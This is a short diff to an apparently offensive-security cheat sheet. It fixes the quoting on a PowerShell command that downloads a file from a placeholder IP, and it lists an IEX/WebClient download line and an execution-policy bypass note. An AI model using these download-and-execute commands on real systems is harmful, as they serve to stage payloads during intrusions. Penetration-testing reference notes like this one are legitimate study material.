@@ -1,6 +1,6 @@
 PS download file
 
-powershell -c "Invoke-WebRequest -Uri <IP> -OutFile c:\temp<filename>
+powershell -c "Invoke-WebRequest -Uri <IP> -OutFile c:\temp<filename>"
 powershell "IEX(New-Object System.Net.WebClient).DownloadFile("<IP>", "c:\temp<filename>")
 
 Script execution bypass, runs the command
